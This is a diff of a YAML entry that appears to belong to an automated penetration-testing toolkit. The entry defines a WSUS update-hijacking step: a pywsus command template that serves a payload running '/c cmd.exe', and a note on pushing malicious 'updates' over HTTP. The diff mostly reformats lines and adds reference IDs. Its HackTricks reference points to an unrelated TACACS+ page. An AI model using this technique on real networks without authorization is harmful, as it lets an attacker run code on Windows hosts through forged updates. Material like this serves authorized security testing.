@@ -5,8 +5,7 @@ preconditions:
 - os==windows
 parameters:
   target_ip: from_engagement.target_ip
-command_template: python3 pywsus.py --host {wsus_ip} --port 8530 --executable /path/to/payload.exe
-  --payload-args '/c cmd.exe'
+command_template: python3 pywsus.py --host {wsus_ip} --port 8530 --executable /path/to/payload.exe --payload-args '/c cmd.exe'
 parser: generic_parser
 expected_effects:
 - action_completed
@@ -14,6 +13,11 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: If WSUS uses HTTP (not HTTPS), MITM update traffic to push malicious 'updates'.
-  SharpWSUS for injection from compromised WSUS server directly.
+mechanism: If WSUS uses HTTP (not HTTPS), MITM update traffic to push malicious 'updates'. SharpWSUS for injection from compromised
+  WSUS server directly.
 hacktricks_ref: network-services-pentesting/49-pentesting-tacacs+.md
+references:
+  ocd_mindmap_node_ids:
+  - 4a8c25b65d
+  - c530b6be65
+  - cb4e0c4e22
